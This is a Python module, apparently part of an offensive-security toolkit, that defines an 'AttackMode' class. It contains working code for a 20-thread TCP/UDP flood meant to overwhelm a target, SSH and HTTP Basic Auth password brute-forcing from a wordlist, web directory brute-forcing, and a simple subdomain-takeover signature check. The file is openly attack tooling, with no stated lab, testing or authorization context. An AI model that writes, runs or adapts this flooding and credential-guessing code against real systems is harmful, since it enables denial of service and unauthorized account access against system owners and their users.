import socket
import threading
import time
import os
import random
import requests
from ..utils.logger import get_logger

try:
    import paramiko
except ImportError:
    paramiko = None

logger = get_logger()

class AttackMode:
    def __init__(self, args):
        self.args = args

    def run(self):
        if getattr(self.args, 'flood', False):
            self.start_flood()
        elif getattr(self.args, 'bruteforce', None):
            self.start_brute()
        elif getattr(self.args, 'dirbrute', False):
             self.start_dirbrute()
        elif getattr(self.args, 'takeover', False):
             self.subdomain_takeover()
        else:
             logger.info("Attack mode selected. Use --help for options.")

    def start_flood(self):
        target = getattr(self.args, 'target', None)
        port = getattr(self.args, 'port', 80)
        protocol = getattr(self.args, 'protocol', 'tcp').lower()
        duration = getattr(self.args, 'duration', 10)
        
        logger.info(f"Starting {protocol.upper()} flood on {target}:{port} for {duration}s...")
        
        stop_time = time.time() + duration
        threads = []
        
        def flood_worker():
            while time.time() < stop_time:
                try:
                    if protocol == 'tcp':
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(1.0)
                        s.connect((target, port))
                        s.send(random._urandom(1024))
                        s.close()
                    else: # UDP
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.sendto(random._urandom(1024), (target, port))
                except:
                    pass

        # Use multiple threads for flooding
        for _ in range(20):
             t = threading.Thread(target=flood_worker)
             t.start()
             threads.append(t)
             
        for t in threads:
            t.join()
            
        logger.success(f"Flood attack on {target} finished.")

    def start_brute(self):
        service = self.args.bruteforce.lower()
        target = self.args.target
        user = getattr(self.args, 'user', 'root')
        wordlist = getattr(self.args, 'wordlist', None)
        
        if not wordlist or not os.path.exists(wordlist):
            logger.error("A valid wordlist is required for brute-forcing.")
            return

        if service == 'ssh':
            self._ssh_brute(target, user, wordlist)
        elif service == 'http':
            self._http_brute(target, user, wordlist)
        else:
            logger.error(f"Unsupported brute-force service: {service}")

    def _ssh_brute(self, target, user, wordlist):
        if not paramiko:
            logger.error("paramiko is not installed. Use 'pip install paramiko'.")
            return
            
        logger.info(f"Bruteforce SSH: {user}@{target}")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        with open(wordlist, 'r') as f:
            for line in f:
                password = line.strip()
                if not password: continue
                logger.brute(f"Trying {user}:{password}")
                try:
                    ssh.connect(target, port=22, username=user, password=password, timeout=2.0)
                    logger.success(f"SUCCESS! {user}:{password}")
                    ssh.close()
                    return
                except:
                    continue
        logger.warning("Brute-force complete. No credentials found.")

    def _http_brute(self, target, user, wordlist):
        logger.info(f"Bruteforce HTTP Basic Auth: {user}@{target}")
        if not target.startswith('http'):
             target = f"http://{target}"
             
        with open(wordlist, 'r') as f:
            for line in f:
                password = line.strip()
                if not password: continue
                logger.brute(f"Trying {user}:{password}")
                try:
                    response = requests.get(target, auth=(user, password), timeout=2.0)
                    if response.status_code == 200:
                        logger.success(f"SUCCESS! {user}:{password}")
                        return
                    elif response.status_code == 401:
                        continue
                except:
                    continue
        logger.warning("Brute-force complete. No credentials found.")

    def start_dirbrute(self):
        target = self.args.target
        wordlist = getattr(self.args, 'wordlist', None)
        
        if not wordlist or not os.path.exists(wordlist):
            logger.error("A valid wordlist is required for directory brute-forcing.")
            return

        if not target.startswith('http'):
             target = f"http://{target}"
        if not target.endswith('/'):
             target += '/'
             
        logger.info(f"Starting directory brute-force on {target}")
        
        with open(wordlist, 'r') as f:
            for line in f:
                path = line.strip()
                if not path: continue
                url = f"{target}{path}"
                logger.brute(f"Checking {url}")
                try:
                    response = requests.get(url, timeout=2.0)
                    if response.status_code == 200:
                        logger.success(f"FOUND: {url} (200 OK)")
                    elif response.status_code == 301 or response.status_code == 302:
                        logger.success(f"REDIRECT: {url} ({response.status_code})")
                except:
                    continue

    def subdomain_takeover(self):
        target = self.args.target
        # Very basic check for common "pointing to nowhere" signatures
        signatures = ["NoSuchBucket", "nosuchbucket", "herokucdn.com", "github.io"]
        logger.info(f"Checking subdomain takeover for {target}...")
        try:
            response = requests.get(f"http://{target}", timeout=5)
            content = response.text
            for sig in signatures:
                if sig in content:
                    logger.success(f"POSSIBLE TAKEOVER DETECTED on {target} ({sig})")
                    return
            logger.info(f"No obvious takeover signatures found on {target}")
        except:
             logger.error(f"Could not connect to {target}")
